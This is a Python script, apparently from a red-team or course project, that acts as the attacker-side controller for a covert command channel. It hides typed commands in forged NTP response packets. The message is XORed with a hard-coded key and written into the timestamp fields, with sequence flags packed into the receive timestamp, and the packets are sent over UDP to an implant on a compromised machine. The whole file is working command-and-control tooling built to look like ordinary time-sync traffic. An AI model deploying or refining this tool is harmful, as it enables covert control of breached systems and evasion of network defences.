import socket
import ntplib
import struct
import math
import time
import sys

PRIVATE_KEY_WORD='Bruh'
PRIVATE_KEY=PRIVATE_KEY_WORD.encode('ascii')
SLEEP=0

#Function to convert float values to 32-bit fixed-point values
def pack_fixed32(float_value : float):
    fraction, integer = math.modf(float_value)
    integer = int(integer)
    fraction = int(fraction * (2**16)) #fraction uses 16 bits of space
    
    #!: Big endian
    #H: unsigned short (2 bytes == 16 bits)
    return struct.pack('!HH', integer, fraction)

#Function to convert float values to 64-bit fixed-point values
def pack_fixed64(float_value : float):
    fraction, integer = math.modf(float_value)
    integer = int(integer)
    fraction = int(fraction * (2**32))

    #!: Big endian
    #I: unsigned int (4 bytes == 32 bits) #fraction uses 16 bits of space
    return struct.pack('!II', integer, fraction)

"""
Function to send NTP response packets from the attack box to the compromised machine.

Arguments:
    sock (socket.socket): the UDP socket to send data over
    client_address (str): the IP address of the compromised machine
    client_port (int): the port receiving NTP response packets
    data (bytes): the data to encode within the NTP packet
    last_packet (bool): indicates the final packet of data to send
    seqNum (int): indicates the packet's data transmission order
"""
def send_ntp_response(sock, client_address, client_port, data, last_packet, seqNum):

    #Get legitimate NTP response data
    c = ntplib.NTPClient()
    response = c.request('time.google.com', version=3)

    #Hard-coded NTP packet fields
    flags = b'\x24'
    peer_clock_stratum = b'\x02'
    peer_polling_interval = b'\x00'
    peer_clock_precision = b'\xe7'
    reference_id = b'\xc2\x79\xcf\xf9'

     #32-bit fixed-point values
    root_delay = pack_fixed32(response.root_delay)
    root_dispersion = pack_fixed32(response.root_dispersion)

    #64-bit fixed-point values
    reference_timestamp = pack_fixed64(response.ref_timestamp)
    origin_timestamp = pack_fixed64(response.orig_timestamp)
    receive_timestamp = bytearray(pack_fixed64(response.recv_timestamp))
    transmit_timestamp = bytearray(pack_fixed64(response.tx_timestamp))

    #Zeroize final two bytes of the receive_timestamp field
    receive_timestamp[7] = 0x00
    receive_timestamp[6] = 0x00

    #Modify flags in receive_timestamp
    if last_packet:
        receive_timestamp[7] |= 1
        length = len(data) - 1
        receive_timestamp[7] |= (length << 1)
        
    else:
        #Final byte's bits: xxxxx110
        receive_timestamp[7] |= (0 << 0)
        receive_timestamp[7] |= (3 << 1)
    
    shift = (seqNum << 3)

    # modifying first byte for sequence
    receive_timestamp[6] |= (shift >> 8) & 0xFF
    # modifying second byte for sequence
    receive_timestamp[7] |= shift & 0xFF

    #Overwrite the final 4 bytes of transmit_timestamp with xored data
    xored_data = bytes([b ^ k for b, k in zip(data, PRIVATE_KEY)])
    for i in range(0, len(xored_data)):
        transmit_timestamp[i + 4] =  xored_data[i]
    

    #Build packet
    packet = b''
    packet += flags
    packet += peer_clock_stratum
    packet += peer_polling_interval
    packet += peer_clock_precision
    packet += root_delay
    packet += root_dispersion
    packet += reference_id
    packet += reference_timestamp
    packet += origin_timestamp
    packet += receive_timestamp
    packet += transmit_timestamp

    sock.sendto(packet, (client_address, client_port))
    time.sleep(SLEEP)
    

if (len(sys.argv) > 1):
    SLEEP = int(sys.argv[1])
else:
    print("No sleep duration specified, assuming 0")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("0.0.0.0", 1234))

# Receive address information from implant before beginning stream
packet, addr = sock.recvfrom(1024)
client_address = socket.inet_ntoa(packet[:4])
client_port = struct.unpack('!H', packet[4:6])[0]

#Send commands to implant
while(True):
    message = input("Type your message.\nTo exit, press Enter.\n\n")
    if len(message) == 0:
        exit(0)

    print("Sending message...\n")
    data = b''
    seq = 0
    for i, char in enumerate(message):
        data += char.encode('ascii')
        if len(data) == 4:
            if i == len(message) - 1:
                send_ntp_response(sock, client_address, client_port, data, True, seq)
            else:
                send_ntp_response(sock, client_address, client_port, data, False, seq)
            data = b''
            seq+= 1
            # time.sleep(64)

    #Send remaining data (<4 bytes)
    if len(data) != 0:
        send_ntp_response(sock, client_address, client_port, data, True, seq)
    
    seq = 0
    
    print("Message sent to implant.\n")